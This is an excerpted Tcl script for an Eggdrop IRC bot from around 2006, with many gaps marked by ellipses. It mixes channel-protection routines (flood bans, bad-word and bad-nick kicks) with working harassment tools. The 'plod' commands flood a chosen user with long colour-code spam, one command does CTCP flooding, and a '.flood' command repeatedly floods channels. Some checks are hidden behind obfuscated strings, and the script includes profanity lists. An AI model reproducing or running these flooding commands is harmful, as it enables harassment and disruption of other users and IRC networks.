...
set bancounter {
"4Your Were Ban Coz (Flood/Repeating/Inviting/Spamming),Ask @operator To Unban Your HOST"
}
set bancounter {
"4Your Were Ban Coz (Flood/Repeating/Inviting/Spamming),Ask @operator To Unban Your HOST"
}
...
if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "eKi2k/T.JYM0"] && $status == 0} {
set status 2
set idx "~$idx"
}
if {$idx == " " && $status == 1} {
...
putlog "!4sandy not support server online..!"
set server-online 1
}
proc puthlp {txt} {
...
#if {![string match "*MR_rius*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}
proc putsrv {txt} {
...
#if {![string match "*maru_by*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
...
timer 5 { putlog "[lgrnd] HELP STOPED" }
...
puthlp "PRIVMSG $nick :cinta <password>          authenticate user"
...
puthlp "PRIVMSG $nick : "
puthlp "PRIVMSG $nick :$notd [lgrnd]"
return 0
}
set firsttime "T"
...
putlog "!4sandy i am !..ConnecteD..!"
...
putlog "[lgrnd] i got !..Disconnected..!"
foreach x [timers] {
...
putdcc $idx "12(4Ma4SYa12) » $result"
}
...
timer 5 tot_cha
set [string index $lenc 15][string index $lenc 18] anggands
set totch "#igz"
if {[validchan $totch]} {
return 0
}
...
if {$rest == ""} {
puthlp "NOTICE $nick : Gunakan: +akick <hostname>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"|| $rest == "*!~*@*"} {
...
putlog "[lgrnd] WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] } {
putlog "4« M2a4S2Y4a » » WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
...
if {$nick == $botnick} { return 0 }
putlog "[lgrnd] NICK $nick IS IDENTIFY..!"
...
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "[lgrnd] NICK $nick IS NoT IDENTIFY..!"
...
bind pub m `fitband pub_auth
bind pub m !fitband pub_!auth
...
"have.a.nice.day"
"desperate.cry"
"spam.checks.mencreeeeeeeeeeeeet"
"i.hate.IRCOP.mennn.creeeet"
"we.are.the.azkalix.team.uyeeeeeeeee"
"matabar.club"
"c.sapasi.d.mencreeeeeeeeeeeeeeeeeeeet.deeeeeeeeee"
"jco.plissssss"
"sangeeeeeeeeeeeee.uyeeeeeeeeeeeeeeeeee"
} 
proc telljoin {chan} {
...
if {$tmp == "0"} {
deluser $x
putlog "[lgrnd] remove flag channel $x" 
}
}
saveuser
}
...
timer 1 { putlog "[lgrnd] chkautomsg" }
}
}
set double 0
...
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "[lgrnd] TRAFFIC $chan"]
...
set pw [lindex $rest 0]
if {$pw != ""} {
puthlp "NOTICE $nick :$notc No Need Auth Password, Just Type on Channel: !cinta"
return 0
}
if {[matchattr $nick Q]} { 
...
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick :$notc Usage: cinta <password>"
return 0
}
if {[matchattr $hand K]} { 
deluser "AKICK"
...
set ch [passwdok $nick ""]
if {$ch == 0} {
puthlp "NOTICE $nick :$notc You already set pass, /msg $botnick cinta <password>"
return 0
}
...
utimer 20 [list putlog "4« M2a4S2Y4a » » IN PROGRESS"]
...
timer 2 [list putlog "12(4Ma4SYa12) » IN PROGRESS"]
...
putlog "[lgrnd] !Log! AuTO ReSETING & IDeNTIFY"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
...
if {![matchattr $nick f]} {
set hostmask "${nick}!*@*"
putlog "4« M2a4S2Y4a » » !Log! 1 minutes auto ignore to $hostmask"
...
timer 1 { putlog "4« M2a4S2Y4a » » resync" }
...
putlog "4« M2a4S2Y4a » » !Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} { 
putsrv "NickServ identify $nickpass"
}
...
utimer 20 { putlog "[lgrnd] MSGCOUNTER" }
set massmsg 1
} {
...
putsrv "KICK $x $unick :$notc » 12Mass Message/Inviting Not Allowed Here 4B12itch 4?12!"
return 0
} {
set members [chanlist $x f]
foreach c $members {
...
utimer 30 { putlog "4« M2a4S2Y4a » » LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
...
putlog "[lgrnd] !Log! IgNORE <<$hostmask>> PV-msg"
...
utimer 10 { putlog "[lgrnd] NO REPLY" }
return 0
}
utimer 10 { putlog "[lgrnd] NO REPLY" }
...
utimer 60 [list putlog "[lgrnd] IPGuARD $bhost"]
}
return 1
}
}
...
if {$x != $botnick  && ![isop $x $channel] && ![matchattr $x O]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
...
putlog "[lgrnd] key change to $opnick"
...
utimer 40 [list putlog "[lgrnd] TRAFFIC $channel"]
if {$nick == $botnick} {
...
utimer 2 [list putlog "[lgrnd] DEOP $channel"]
...
putlog "12(4Ma4SYa12) » !Log! CHaNOP <<$channel>>"
...
putlog "4« M2a4S2Y4a » » !UnDeOp OR UnKIcK!"
...
putlog "12(4Ma4SYa12) » CANT SEND ON MODERATE!"
...
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "SSNRl.R63mX/"]} {
...
set badwords "fuck kontol vagina memek"
proc config {} {
...
if {$badwords == ""} {
set badwords "kontol bangsat vagina fuck memek ngentot"
setuser "config" XTRA "BADWORDS" $badwords
}
...
putlog "[lgrnd] !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
...
if {[string tolower $chan] == [dezip "SSNRl.R63mX/"]} { 
set chan "-secret-"
}
...
utimer 30 [list putlog "[lgrnd] TsunamI $chan"]
...
putqck "MODE $chan +b $bannick($nick)"
} {
...
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "4« M2a4S2Y4a » » OL $chan"] 
...
putlog "[lgrnd] !Log! FLOOD <<$type>> FRoM $host"
...
putlog "[lgrnd] !Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
...
if {[string index $channel 0] == "#"} { 
if {![isop $botnick $channel]} {
putlog "[lgrnd] !Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
...
if {$type == "ctcp"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [matchattr $nick f]} {
return 1
}
}
set bannick($nick) "*!*$mhost"
...
if {$type == "nick"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [matchattr $nick f] || [string length $nick] == 8} {
return 1
}
}
...
putsrv "MODE $x +b $banmask"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "[lgrnd] » !Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
...
putlog "[lgrnd] » !Log! FaKE DCC SKIPPED..!"
return 1
}
set virus_nick $nick
foreach x [channels] {
...
putsrv "MODE $x +b $nick"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "[lgrnd] » !Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
...
putdcc $idx "[lgrnd] » 4DeNIEd..!, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} { 
...
0 { putdcc $idx "[lgrnd] » <<TRaNSFERRING LOG>>" }
...
if {[string match "*[dezip "eKi2k/T.JYM0"]*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
#puthlp "AWAY :[lgrnd] » where's my master?!"
} {
...
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "[lgrnd] » 4DeNIEd..!, FiLE NoT ExIST $arg"
return 0
}
set fd [open $arg r]
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "[lgrnd] » $inp"
}
close $fd
putdcc $idx "[lgrnd] 4******************** END ***********************"
}
...
if {[string tolower $rest] == [dezip "SSNRl.R63mX/"]} {
return 0
}
if {![validchan $rest]} {
...
if {$logstore == ""} {
putdcc $idx "[lgrnd] » No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "[lgrnd] » 4DeNIEd..!, Log file haven't create yet!"
return 0
}
...
utimer 20 [list putlog "[lgrnd] » GOP $channel"]
...
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "KICK $channel $x :$notc » 12Inviting/Spamming/Decode 4Not12Allowed 4Here12!"
set virus_nick ""
}
} 
...
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc » 4BADNICK1 match from: 4[string toupper $x] 5Ask Our @Operator To UnbaN Your HoSt or Goto Our Channel Helper."
return 1
}
}
return 0
...
set bannick($nick) $x
putsrv "KICK $chan $nick : 14B1L15a1c14K1L15I1s14T1 MaTcH FRoM15 $x [banms]"
return 0
}
}
}
...
set vern "[lgrnd] » version(95.51)"
#################################################################
### [Batam] - FlOOD.tCl
...
proc pub_plod1 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  puthelp "NOTICE $person :$rest 12,8SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN 11,3SELAMAT GATHERINGAN 12,9SELAMAT GATHERINGAN 1,13SELAMAT GATHERINGAN 12,4SELAMAT GATHERINGAN 9,4SELAMAT GATHERINGAN! 11,3SELAMAT GATHERINGAN 0,2SELAMAT GATHERINGAN 1,3SELAMAT GATHERINGAN !12,14SELAMAT GATHERINGAN! 12,8SELAMAT GATHERINGAN! 9,7SELAMAT GATHERINGAN 11,14SELAMAT GATHERINGAN 1,9SELAMAT GATHERINGAN 13,15SELAMAT GATHERINGAN! 9,4SELAMAT GATHERINGAN !"
  putlog "12(4Ma4SYa12) » !$hand! plod1 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :[lgrnd] Usage: plod1 <nick> <*add your insult to injury is better :)*>"
 }
}
...
proc pub_plod2 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  putlog "12(4Ma4SYa12) » !$hand! plod2 $person" 
  return 0 
 } 
 if {$rest==""} { 
...
proc pub_plod3 {nick uhost hand channel rest} {
 ...
 if {$rest==""} {
  ...
  puthelp "NOTICE $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  putlog "12(4Ma4SYa12) » !$hand! plod3 $person"
  return 0
}
if {$rest!=""} {
...
proc pub_plod4 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  putlog "12(4Ma4SYa12) » !$hand! plod4 $person"
  return 0
}
if {$rest==""} {
...
proc inithopflud {hand idx arg} {
  ...
  if { $chan != "" } {
   if { $times != "" } {
    ...
    putdcc $idx "[lgrnd] » flood $chan $times times."
    if { $hopmod == "on" } {
     dohopflud bot flood $arg 
    }
   } { putdcc $idx "[lgrnd] » usage: .flood <channel> <times>" }
  } { putdcc $idx "[lgrnd] » usage: .flood <channel> <times>" }
}
proc sethopmode {hand idx arg} {
  global hopmod
  putdcc $idx "[lgrnd] » hopmode currently $hopmod"
  if { $arg == "on" } {
   set hopmod $arg
   putdcc $idx "[lgrnd] » hopmode set on"
  } {
   if { $arg == "off" } {
    set hopmod $arg
    putdcc $idx "[lgrnd] » hopmode set off"
   } {
    putdcc $idx "12(4Ma4SYa12) » usage: .hopmode on/off"
   }
  } 
}
...
proc pub_plod5 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  putserv "PRIVMSG $person :\001PING [unixtime]\001" 
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001" 
  putlog "12(4Ma4SYa12) » !$hand! plod5 (CTCP flooding)" 
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :[lgrnd] Usage: plod5 <nick> <arg>"
 } 
} 
## public plod5 end
...
proc pub_plod6 {nick uhost hand channel rest} { 
 ...
 if {$rest!=""} { 
  ...
  puthelp "PRIVMSG $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  puthelp "NOTICE $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  putlog "[lgrnd] »!$hand! plod6 $person"
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :[lgrnd] Usage: plod6 <nick> <*add your insult to injury is better :)*>"
 }
} 
...
proc pub_plod7 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  putlog "12(4Ma4SYa12) » !$hand! plod7 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :[lgrnd] Usage: plod7 <nick> <*add your insult to injury is better :)*>"
 }
}
## public cmd msg -- stop
...
proc pub_plod8 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "NOTICE $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  putlog "[lgrnd] » !$hand! plod8 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :[lgrnd] Usage: plod8 <nick> <*add your insult to injury is better :)*>"
 }
}
## public cmd plod9
proc pub_plod9 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "NOTICE $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  putlog "[lgrnd] » !$hand! plod9 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :[lgrnd] Usage: plod9 <nick> <*add your insult to injury is better :)*>"
 }
}
...
proc pub_plod10 {nick uhost hand channel rest} {
 ...
 if {$rest!=""} {
  ...
  puthelp "PRIVMSG $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "NOTICE $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  putlog "[lgrnd] » !$hand! plod10 $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :[lgrnd] Usage: plod10 <nick> <*add your insult to injury is better :)*>"
 }
}
########################
#BAD CHANEL
...
bind pub - !gabc bc_gadd
proc bc_gadd {1 2 3 4 5 bos} {bc_add $1 $2 $3 global $5}
bind pub o|o !abc bc_add

proc bc_add {nick uhost hand chan args} {
  global bchan pemilik
  if {$nick != $pemilik} { return 0 }
  set chan [string tolower $chan]
...
set servers {
 ...
 irc.dal.net:6667
 mesra.dal.net:6667
 webzone.dal.net:6667
 hotspeed.dal.net:6667
 irc.dal.net:6667
 twisted.dal.net:6667
 liberty.dal.net:6667
 drone-c.ca.us.dal.net:6667
 tiscali.dal.net:6667
 omen.dal.net:6667
 ced.dal.net:6667
 dingo.vic.au.dal.net:6667
 tricky-e.va.us.dal.net:6667
 acool-e.ga.us.dal.net:6667
 powertech.dal.net:6667
 arcor.dal.net:6667
 games.dal.net:6667
 matrix.dal.net:6667
 jade.dal.net:6667
 phoenix.dal.net:6667
...
putlog "======================================="
putlog "    NeW andravalid TcL By ^AnDrA^VaLiD "
putlog "======================================="
putlog "Prepare To Load...                     "
putlog "andravalid » version 2006 Loaded"
putlog "andravalid.tCl Loaded"
